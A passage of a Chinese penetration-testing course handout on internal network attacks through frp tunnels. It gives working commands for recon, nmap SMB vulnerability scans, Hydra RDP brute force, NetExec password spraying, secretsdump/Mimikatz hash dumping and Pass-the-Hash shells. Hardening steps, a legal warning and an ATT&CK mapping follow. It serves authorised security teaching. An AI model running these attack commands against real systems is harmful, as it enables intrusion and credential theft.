# 关键看：内网 IP 的连接 → 发现活跃的内网通信对象
```

> 💡 **攻击者视角**：`ipconfig` 告诉我网段是 192.168.1.0/24，`arp -a` 告诉我这个网段里有其他主机。下一步就是扫描这些主机。

**图形界面方式**：`Win+R` → `ncpa.cpl` → 右键网卡 → 状态 → 详细信息。

**第二步：用户、组和系统信息——"我是谁？我能做什么？"**

```powershell
# 当前用户信息（权限、组成员、特权）
whoami /all
# 关键看：
#   GROUP INFORMATION → 是否在 Administrators 组？
#   PRIVILEGES INFO   → 是否有 SeDebugPrivilege、SeImpersonatePrivilege？

# 本地用户列表
net user
# 关键看：有哪些用户 → 猜测弱口令的起点

# 本地管理员组成员
net localgroup administrators
# 关键看：除当前用户外还有谁是管理员 → 其他可攻击的高权限账户

# 系统信息（OS版本、补丁列表）
systeminfo
# 关键看：
#   OS Name / OS Version → 确定系统版本
#   Hotfix(s)            → 已安装补丁列表 → 反向推断未修补的漏洞
```

> 💡 **攻击者视角**：`whoami /all` 显示当前用户是管理员且有 `SeDebugPrivilege`——可以直接 dump 其他进程的凭据。`systeminfo` 的补丁列表可以对照漏洞数据库（如 Windows Exploit Suggester）找出可利用的漏洞。

**第三步：进程、服务和安全软件——"有什么在保护这台机器？"**

```powershell
# 查看运行的进程（重点发现安全软件）
Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
# 关键看：
#   MsMpEng.exe      → Windows Defender 正在运行
#   csrss.exe        → 正常系统进程
#   如果看到 360、火绒等 → 需要额外的绕过技术

# 查看运行的服务
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName
# 关键看：是否有未加固的服务可被利用
```

> 💡 **攻击者视角**：如果发现 Windows Defender 运行中，Mimikatz 可能被拦截——需要先关闭实时防护或使用内存加载方式。

**第四步：网络邻居和共享资源——"周围有什么？"**

```powershell
# 查看网络上的 Windows 主机（NetBIOS 广播）
net view
# 预期：列出同网段/同域中可见的 Windows 主机名

# 查看本机共享资源
net share
# 预期：C$、ADMIN$、IPC$ 等默认共享
# 攻击者关注：IPC$（可用于空连接枚举）、C$/ADMIN$（可远程读写文件）

# 查看远程主机的共享
net view \\<其他主机IP>
# 目的：确认远程主机有哪些可访问的共享文件夹
```

---

### 实验8：Nmap 内网扫描（通过 frp 隧道从验证环境执行）

> ⚠️ **前置条件**：完成实验1-4，SOCKS5 代理可用。
>
> **实验背景**：实验7 中 `arp -a` 和 `ipconfig` 已经告诉我们 Win11 实验主机或授权靶机的网段和 IP。现在从验证环境通过 frp 隧道远程扫描目标，验证发现的信息并探测更多细节。

**第一步：直接扫描 frp 映射端口（快速摸底）**

```bash
# 不经过 SOCKS5，直接扫描 CVM 上的映射端口（速度快）
nmap -sV -p 10002,10080 <CVM公网IP>

# 预期输出：
# PORT     STATE  SERVICE       VERSION
# 10002/tcp open  http          Apache/PHPStudy Web
# 10080/tcp open  socks5        frp socks5 proxy
```

> 💡 **这一步的意义**：通过 frp 映射端口直接扫，速度快、不需要 proxychains。可以快速确认哪些服务在运行、运行什么版本——为后续选择攻击工具提供依据。

**第二步：通过 SOCKS5 代理扫描（完整端口扫描）**

```bash
# 确认 proxychains 配置：socks5 <CVM公网IP> 10080

# 扫描目标主机的常用端口（SOCKS5 从 Win11 本地发起，所以目标是 127.0.0.1）
proxychains nmap -sT -p 80,135,139,445,3389,5985 127.0.0.1

# 预期输出：
# PORT     STATE  SERVICE
# 80/tcp   open   http
# 其他端口是否开放取决于 Win11 或授权靶机的服务状态
```

> 💡 **SOCKS5 扫描 vs 直接扫映射端口**：
> - **直接扫映射端口**：速度快，但只能扫已配置映射的端口
> - **SOCKS5 + proxychains**：速度慢，但可以扫目标主机上的**所有端口**，包括未映射的
> - 实际操作中，先快速扫映射端口摸底，再用 SOCKS5 补充扫描

**第三步：SMB 漏洞检测与共享枚举**

```bash
# 通过代理检测 SMB 已知漏洞（如 EternalBlue MS17-010）
proxychains nmap -sT --script smb-vuln* -p 445 127.0.0.1

# 通过代理枚举 SMB 共享和用户
proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
# 目的：发现可访问的共享和用户列表 → 为暴力破解和横向移动提供目标
```

---

## 📝 任务三知识点总结

| 知识点 | 要点 |
| --- | --- |
| 三个核心问题 | "我在哪"（网络位置）、"周围有什么"（目标发现）、"我能做什么"（权限评估） |
| 三层收集体系 | 本机信息 → 网络邻居 → 主动扫描，由近及远、由被动到主动 |
| 被动收集（不触发告警） | `ipconfig`、`route print`、`arp -a`、`netstat -an` |
| 主动扫描（可能触发告警） | `nmap -sT`、`smb-vuln*`、`smb-enum-*` |
| 两种扫描方式 | 直接扫映射端口（快但有限）vs SOCKS5 + proxychains（慢但完整） |
| 攻击者视角 | 每条信息都在回答"下一步能攻击什么"——信息收集是攻击链的基础 |

---

# 任务四 内网渗透实战

## 🧠 理论知识

### 攻击链：从信息收集到横向移动

前面的任务已经完成了攻击链的前三步：

```
✅ 已完成                           ⬇️ 本任务要做的

frp 隧道建立（任务一/二）            弱口令暴力破解 → 获取凭据
内网信息收集（任务三）               Pass-the-Hash → 横向移动到其他主机
    ↓                               获取更多凭据 → 扩大战果
知道了目标 IP、端口、服务版本
```

### Pass-the-Hash（哈希传递攻击）——为什么凭据比密码更重要？

Windows 系统不存储明文密码，而是存储密码的 **NTLM 哈希**（可以理解为密码的"指纹"）。问题在于：

```
正常登录：
  用户输入密码 → Windows 计算密码的哈希 → 与存储的哈希比对 → 匹配则通过

Pass-the-Hash 攻击：
  攻击者跳过"输入密码"这一步，直接把窃取到的哈希发给目标机器
  Windows 比对哈希 → 匹配 → 通过！

后果：只要拿到哈希，不需要知道密码就能登录
     → 哈希 ≈ 密码（在认证层面等价）
```

> 💡 **这就是为什么"改密码"不够**——如果哈希已经被窃取，攻击者可以在密码更改之前就使用它。真正的防御是阻止哈希被窃取（Credential Guard）或禁止 NTLM 认证（Protected Users）。

### 横向移动工具对比

| 工具 | 协议/端口 | 特点 | 适用场景 |
| --- | --- | --- | --- |
| **NetExec (nxc)** | SMB(445) / WinRM / LDAP | 批量验证凭据、远程执行命令 | 快速验证哈希是否有效 |
| **impacket-wmiexec** | WMI(135) | 无文件落地，隐蔽性好 | 需要隐蔽的远程执行 |
| **impacket-psexec** | SMB(445) | 上传服务并执行，返回 SYSTEM Shell | 需要最高权限的 Shell |
| **evil-winrm** | WinRM(5985) | 交互式 Shell，支持文件上传/下载 | 需要交互式操作和文件传输 |

> 💡 **工具选择逻辑**：先用 `nxc` 验证凭据是否有效（一行命令就能试），再用 `wmiexec`/`psexec`/`evil-winrm` 获取交互式 Shell 进行深入操作。

---

## 🛠️ 实践操作

### 实验9：弱口令攻击

> ⚠️ **前置条件**：frp 隧道已建立，RDP 映射端口 10001 和 SMB 映射端口 10004 可用。

**前置准备——在授权靶机上创建弱口令账户**：

```powershell
# 在授权靶机上以管理员身份运行
net user testuser P@ssw0rd /add
net user admin123 123456 /add
net localgroup administrators admin123 /add

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

**第一步：使用 Hydra 暴力破解 RDP**

```bash
# 在验证环境中创建用户字典
vim /tmp/users.txt
```

写入：

```text
administrator
testuser
admin123
```

```bash
# 创建密码字典
vim /tmp/passwords.txt
```

写入：

```text
123456
password
P@ssw0rd
admin
admin123
qwerty
```

```bash
# 通过 frp 隧道暴力破解 RDP
hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<CVM公网IP> -s 10001 -t 4

# 预期输出：
# [3389][rdp] host: <CVM公网IP>   login: admin123   password: 123456
# [3389][rdp] host: <CVM公网IP>   login: testuser   password: P@ssw0rd
```

> 💡 **攻击者视角**：找到了两个有效凭据——`admin123:123456` 和 `testuser:P@ssw0rd`。其中 `admin123` 是管理员，可以直接用于横向移动。

**第二步：使用 NetExec 进行 SMB 密码喷洒**

```bash
# NetExec 比 Medusa 更适合 SMB 协议，输出信息更丰富
# 验证 administrator 账户的密码列表
nxc smb <CVM公网IP> --port 10004 -u administrator -p /tmp/passwords.txt

# 预期输出（成功时显示 Pwn3d!）：
# SMB  <CVM公网IP>:10004  授权靶机  [+] administrator:P@ssw0rd (Pwn3d!)

# 批量验证多个用户
nxc smb <CVM公网IP> --port 10004 -u /tmp/users.txt -p /tmp/passwords.txt
```

> 💡 **为什么用 nxc 而不是 Medusa？** NetExec 专为 Windows 协议设计，不仅能验证密码，还能直接远程执行命令（`-x "whoami"`）、导出哈希（`--sam`），是内网渗透的瑞士军刀。

---

### 实验10：Pass-the-Hash 横向移动

> ⚠️ **前置条件**：已通过实验9获取授权靶机的管理员凭据（`administrator:P@ssw0rd`）。
>
> **攻击链位置**：弱口令破解 → 明文密码 → **获取哈希** → **PtH 横向移动**（本实验）

**工具安装**（在验证环境中执行）：

```bash
sudo apt update
sudo apt install -y impacket-scripts python3-impacket netexec
which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
```

**第一步：获取 NTLM 哈希**

拿到明文密码后，下一步是获取 NTLM 哈希。有两种方法：

```bash
# 方法一：通过 secretsdump 远程导出（推荐，最简单）
# 通过 SOCKS5 代理连接授权靶机，导出所有本地用户的哈希
proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1

# 预期输出（关键部分）：
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH值>:::
#                  ↑ LM Hash（通常为空）                ↑ NTLM Hash（这就是我们需要的）

# 方法二：通过 Evil-WinRM + Mimikatz（交互式，更直观）
evil-winrm -i <CVM公网IP> -P 10003 -u administrator -p 'P@ssw0rd'

# 在 Evil-WinRM 会话中执行 Mimikatz
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
# 或上传 mimikatz 本地执行
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

> 💡 **记录 NTLM 哈希**：将输出中的 NTLM 哈希值保存好，后续步骤会用到。格式类似：`e0f2b4b11bcf22d4c7d0c4c4e8a4b3f1`

**第二步：使用哈希进行 PtH 攻击**

有了 NTLM 哈希，即使不知道密码也能登录目标机器：

```bash
# 方法一：NetExec 快速验证哈希（最快，一行命令）
nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
# 预期：显示 [+] administrator:<HASH> (Pwn3d!) → 哈希有效

# 方法二：NetExec 远程执行命令（验证 + 执行一步到位）
nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"
# 预期：显示命令执行结果 NT AUTHORITY\SYSTEM

# 方法三：Impacket wmiexec（交互式 Shell，走 SOCKS5，无文件落地）
proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
# 预期：获得授权靶机的命令行 Shell

# 方法四：Impacket psexec（SYSTEM 权限 Shell，走 SOCKS5）
proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
# 预期：获得 NT AUTHORITY\SYSTEM 的最高权限 Shell
```

> 💡 **PtH 的关键理解**：整个过程中我们**从未输入过密码**——只用了哈希。这就是为什么 NTLM 哈希在安全领域被视为"等价于密码"的敏感凭据。防御措施见任务五。

---

### 扩展：域环境渗透（详见实验六）

> 本任务的横向移动实验聚焦于**工作组环境**下的凭据获取与 PtH。域环境的更高级攻击（Kerberoasting、DCSync、黄金票据、BloodHound）详见 **《实验六：Windows域环境渗透与提权》**。

| 项目八（本讲义） | 实验六（独立实验） | 衔接点 |
| --- | --- | --- |
| frp内网穿透 → 建立隧道 | 域信息收集 → 识别域控 | 隧道建立后第一步是信息收集 |
| 弱口令暴力破解 | Kerberoasting → 提权 | 暴力破解的凭据可作为起点 |
| PtH → 工作组横向移动 | DCSync → 域级横向移动 | PtH 获取的域管哈希可直接 DCSync |
| 网络层加固 | 身份层加固 | 两者结合 = 完整防御体系 |

---

## 📝 任务四知识点总结

| 知识点 | 要点 |
| --- | --- |
| 攻击链位置 | 信息收集（任务三）→ 弱口令破解 → 获取凭据 → PtH 横向移动 |
| 弱口令攻击 | Hydra 暴力破解 RDP；NetExec 批量验证 SMB 凭据 |
| NTLM 哈希 | Windows 存储密码的"指纹"，在认证中等价于明文密码 |
| Pass-the-Hash | 无需明文密码，直接用哈希完成认证 → 为什么"哈希泄露 = 密码泄露" |
| 获取哈希 | `impacket-secretsdump`（远程导出）或 Mimikatz（本地提取） |
| 横向移动工具 | nxc（快速验证）、wmiexec（隐蔽执行）、psexec（SYSTEM Shell）、evil-winrm（交互式） |
| frp 的角色 | 将内网服务映射到公网，使验证环境中的工具可以访问内网主机 |

---

# 任务五 内网安全防御与加固

## 🧠 理论知识

### 内网安全纵深防御体系

```
内网纵深防御五层体系：

第一层：网络隔离
├── 划分安全区域（DMZ/办公区/服务器区/核心区）
├── VLAN + 防火墙规则限制跨区域访问
└── 微分段 —— 每台服务器独立策略

第二层：身份安全
├── 最小权限原则
├── Protected Users组 —— 禁止高权限账户使用NTLM
├── Credential Guard —— 虚拟化保护凭据存储
└── 多因素认证（MFA）

第三层：端点安全
├── EDR（端点检测与响应）
├── 应用白名单、补丁管理
└── 主机防火墙

第四层：监控与检测
├── SIEM（安全信息和事件管理）
├── IDS/IPS、网络流量分析
└── 用户行为分析（UEBA）

第五层：应急响应
├── 应急响应预案
├── 取证与溯源能力
└── 快速隔离与恢复
```

### Tier 管理模型

| 层级 | 范围 | 管理账户 | 隔离规则 |
| --- | --- | --- | --- |
| **Tier 0** | 域控、AD DS | Enterprise/Domain Admins | 禁止登录 Tier 1/2 设备 |
| **Tier 1** | 成员服务器 | Server Admins | 禁止登录 Tier 2 设备 |
| **Tier 2** | 工作站 | Workstation Admins | 可登录普通工作站 |

> 💡 **核心原则**：高权限账户只能在高安全级别的设备上使用——防止域管在普通工作站上被窃取凭据。

---

## 🛠️ 实践操作

### 实验11：内网安全加固

> 本实验在 Win11 实验主机或授权靶机上实施安全加固措施，然后从验证环境验证加固效果。

**第一步：启用 SMB 签名**

```powershell
# 在 Win11 实验主机或授权靶机上执行

# 通过注册表启用 SMB 签名
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord

# 重启 SMB 服务
Restart-Service LanmanServer -Force
Restart-Service LanmanWorkstation -Force

# 验证
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature
# 预期：RequireSecuritySignature = True
```

**第二步：将高权限账户加入 Protected Users 组**（域环境）

```powershell
# 在域控上执行
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountName
```

> 💡 **效果**：组成员不能使用 NTLM 认证（强制 Kerberos）、不能使用缓存凭据。直接阻断 Pass-the-Hash。

**第三步：配置防火墙限制横向移动**

```powershell
# 在 Win11 实验主机或授权靶机上执行

# 启用防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 限制 RDP 来源（替换 <管理端IP> 为实际 IP）
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
New-NetFirewallRule -DisplayName "RDP-Allow-Admin" -Direction Inbound `
  -Protocol TCP -LocalPort 3389 -Action Allow -RemoteAddress <管理端IP>

# 限制 WinRM 来源
Disable-NetFirewallRule -DisplayGroup "Windows Remote Management"
New-NetFirewallRule -DisplayName "WinRM-Allow-Admin" -Direction Inbound `
  -Protocol TCP -LocalPort 5985 -Action Allow -RemoteAddress <管理端IP>

# 阻止 frp 出站连接（阻止内网穿透工具外连）
New-NetFirewallRule -DisplayName "Block-FRP-Outbound" -Direction Outbound `
  -Protocol TCP -RemotePort 7000 -Action Block
```

**第四步：重置 krbtgt 密码**（域环境，使黄金票据失效）

```powershell
# 必须更改两次（AD 保留上一次密码）
$pwd1 = ConvertTo-SecureString "N3wKrbtgt@2025!A" -AsPlainText -Force
$pwd2 = ConvertTo-SecureString "N3wKrbtgt@2025!B" -AsPlainText -Force

Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd1 -Reset
Start-Sleep -Seconds 60
Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd2 -Reset
```

**第五步：禁用不必要的服务**

```powershell
# 如果不需要 WinRM
Set-Service -Name "WinRM" -StartupType Manual
Stop-Service "WinRM"

# 禁用远程注册表
Set-Service -Name "RemoteRegistry" -StartupType Disabled

# 关闭默认共享
net share C$ /delete
net share ADMIN$ /delete
```

**第六步：验证加固效果**

```bash
# 在验证环境中验证
nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
# 预期：STATUS_ACCESS_DENIED（Protected Users 生效）
```

---

## 📝 任务五知识点总结

| 知识点 | 要点 |
| --- | --- |
| 纵深防御 | 网络隔离→身份安全→端点安全→监控检测→应急响应 |
| Tier模型 | Tier 0（域控）/ Tier 1（服务器）/ Tier 2（工作站） |
| SMB签名 | 防御 SMB 中继攻击 |
| Protected Users | 禁止 NTLM 认证，直接阻断 PtH |
| krbtgt重置 | 更改两次使黄金票据失效 |
| 防火墙策略 | 限制入站来源（IP白名单）、阻止 frp 出站连接 |
| 最小权限 | 禁用不必要的服务和默认共享 |

---

# ✅ 课前检查清单

| 检查项 | 操作 | 通过标准 |
| --- | --- | --- |
| CVM 安全组 | 腾讯云控制台 → 安全组 | 22/7000/7500/10000-20000 端口已放行 |
| CVM 网页登录 | 腾讯云控制台 → 实例 → 登录 → WebShell | 可正常登录 |
| frps 启动 | `ss -tlnp \| grep 7000` | 7000/7500 端口监听 |
| frp Dashboard | 浏览器访问 `http://<CVM公网IP>:7500` | 显示管理面板 |
| Win11/phpStudy | 本机启动 phpStudy Apache | `http://127.0.0.1` 可访问响应式页面 |
| frpc 连接 | Win11 运行 `frpc.exe -c frpc.toml` | 显示 "login to server success" |
| 隧道验证 | 验证环境执行 `nmap -p 10002,10080 <CVM公网IP>` | 端口 open |
| Linux 工具 | `which nmap proxychains4 evil-winrm nxc` | 扩展实验时命令可用 |
| Impacket | `sudo apt install -y impacket-scripts python3-impacket netexec` | 命令可用 |

> **实验结束后务必释放 CVM 实例，避免持续扣费。**

---

# 📚 项目八知识点总结

## 核心操作速查表

| 操作 | 命令/方法 |
| --- | --- |
| 腾讯云安全组 | CVM 控制台 → 安全组 → 添加入站规则 |
| CVM 网页登录 | 腾讯云控制台 → 实例 → 登录 → WebShell |
| frps 前台启动 | `/opt/frp/frps -c /opt/frp/frps.toml` |
| frps 注册服务 | `systemctl enable frps && systemctl start frps` |
| frpc 前台启动 | `C:\frp\frpc.exe -c C:\frp\frpc.toml` |
| frpc 注册服务 | NSSM：`nssm install frpc "C:\frp\frpc.exe" "-c" "C:\frp\frpc.toml"` |
| frp Dashboard | `http://<CVM公网IP>:7500` |
| SSH 远程转发 | `ssh -R 远程端口:127.0.0.1:本地端口 root@<CVM公网IP> -N -f` |
| proxychains | `proxychains nmap -sT -p 端口 127.0.0.1` |
| RDP 暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<CVM公网IP> -s 10001` |
| SMB 密码喷洒 | `nxc smb <CVM公网IP> --port 10004 -u 用户 -p 密码.txt` |
| 获取哈希 | `proxychains impacket-secretsdump administrator:'密码'@127.0.0.1` |
| PtH 攻击 | `nxc smb <IP> --port 10004 -u admin -H '<HASH>'` 或 `proxychains impacket-wmiexec -hashes :HASH admin@127.0.0.1` |
| SMB 签名 | `Set-ItemProperty "LanmanServer\Parameters" "RequireSecuritySignature" 1` |
| Protected Users | `Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"` |
| krbtgt 重置 | `Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd -Reset`（两次） |

## 常见错误排查表

| 问题 | 原因 | 解决方法 |
| --- | --- | --- |
| CVM 端口不通 | 安全组未放行 | 在控制台添加入站规则 |
| frpc 连接失败 | Token 不一致/安全组未放行/Win11 无法上网 | 逐项检查 |
| 隧道已建立但无法访问服务 | 本地服务未启动或配置错误 | 确认服务运行，检查 frpc.toml |
| proxychains 超时 | SOCKS5 隧道断开或配置错误 | 检查 frp SOCKS5 状态和 proxychains 配置 |
| Hydra 超时 | frp 隧道延迟 | 增加 `-w 10`，降低 `-t 1` |
| Evil-WinRM 失败 | WinRM 未启用 | 授权靶机上执行 `Enable-PSRemoting -Force` |
| Mimikatz 被拦截 | Windows Defender | 关闭实时防护（仅实验环境） |

---

## 安全意识

### 攻防对抗思维

> **核心理念**：内网安全的本质不是"建高墙"（边界防火墙），而是"建多层墙"（纵深防御）。本项目通过腾讯云 CVM + frp 的真实内网穿透场景，展示了攻击者如何利用一条出站连接将指定内网服务暴露到公网。唯有实施网络分段、身份隔离、终端防护、监控检测等多层防御，才能有效限制攻击扩散。

### 企业环境防御最佳实践

| 防御层次 | 措施 | 对应威胁 |
| --- | --- | --- |
| **网络隔离** | VLAN + 防火墙 + 微分段 | 内网穿透、横向移动 |
| **出站控制** | 限制内网主机出站连接 | frp/nps 等内网穿透工具 |
| **凭据保护** | Credential Guard + Protected Users + 定期改密 | Pass-the-Hash |
| **协议安全** | SMB签名 + LDAP签名 + Kerberos AES | SMB中继、中间人 |
| **端点防护** | EDR + 应用白名单 + 补丁管理 | 恶意工具执行 |
| **日志监控** | SIEM + IDS/IPS + 网络流量分析 | 攻击行为检测 |
| **权限管理** | Tier模型 + 最小权限 + PAM | 权限提升 |
| **应急响应** | 预案制定 + 定期演练 + 取证能力 | 快速处置 |

### 免责与法律意识

> **法律红线**：在中国，《网络安全法》《刑法》第285条（非法侵入计算机信息系统罪）和第286条明确规定，未经授权对计算机信息系统实施渗透测试、植入内网穿透工具等行为属于违法犯罪，最高可处七年有期徒刑。教学实验环境是学习这些技术的唯一合法场景。

---

## 课堂思考

1. **内网穿透检测**：frp 客户端需要主动连接外部服务器的 7000 端口。作为安全运维人员，如何在企业网络中检测和阻止 frp/nps 等内网穿透工具的使用？请列举至少三种检测方法。

2. **Pass-the-Hash防御**：Protected Users 组可以阻断 PtH，但加入该组后管理员在某些场景下可能无法正常工作。如何在安全性和可用性之间取得平衡？

3. **横向移动溯源**：攻击者通过 frp 隧道从外部访问内网，内网服务器看到的连接来源是 frp 客户端的 IP 而非攻击者的真实 IP。在真实企业环境中，如何有效溯源此类攻击？

4. **纵深防御设计**：假设你是一家中小企业的网络安全管理员，请参考本项目所学内容，按优先级列出至少五项核心安全措施，并说明每项措施防御的攻击技术。

5. **云安全**：本项目使用腾讯云 CVM 作为穿透服务器。在真实场景中，攻击者也可能利用其他云服务（如 AWS、Azure）或免费的 CDN 服务作为中转。企业应如何应对这种"云上跳板"的攻击模式？

---

## 知识关联

| 关联项目 | 关联内容 |
| --- | --- |
| **项目一·走进Windows服务器** | 网络环境配置是本项目的基础；本项目通过腾讯云 CVM 部署 frp，深化网络穿透的理解 |
| **项目四·网站管理** | Web 服务是内网穿透的映射目标；本项目使用 phpStudy/Apache 做轻量化演示 |
| **项目五·远程管理** | RDP 和 WinRM 是横向移动的主要通道——暴力破解和远程执行均依赖这些服务 |
| **项目六·域管理** | 域环境为域级渗透提供基础；域用户凭据、krbtgt 等概念直接来自域管理知识 |
| **项目七·应用安全** | 后门持久化技术在横向移动后的"持久化"阶段使用 |
| **实验六·域环境渗透** | 本项目的 PtH 为实验六的域级攻击提供前置技能，两者构成完整攻击链 |

### MITRE ATT&CK 框架映射

| 本项目技术 | ATT&CK战术 | ATT&CK技术ID |
| --- | --- | --- |
| frp/nps内网穿透 | 命令与控制（C2） | T1090 - Proxy |
| SSH隧道 | 命令与控制（C2） | T1572 - Protocol Tunneling |
| Nmap扫描 | 发现（Discovery） | T1046 - Network Service Discovery |
| RDP暴力破解 | 凭证访问 | T1110.001 - Brute Force |
| Pass-the-Hash | 横向移动 | T1550.002 - Pass the Hash |
| PsExec/WMIExec | 横向移动 | T1021.002 - SMB/Windows Admin Shares |
| Evil-WinRM | 横向移动 | T1021.006 - Windows Remote Management |
| secretsdump/DCSync* | 凭证访问 | T1003.006 - DCSync |
| 黄金票据* | 持久化 | T1558.001 - Golden Ticket |

> *标注*的技术在《实验六：Windows域环境渗透与提权》中详细展开
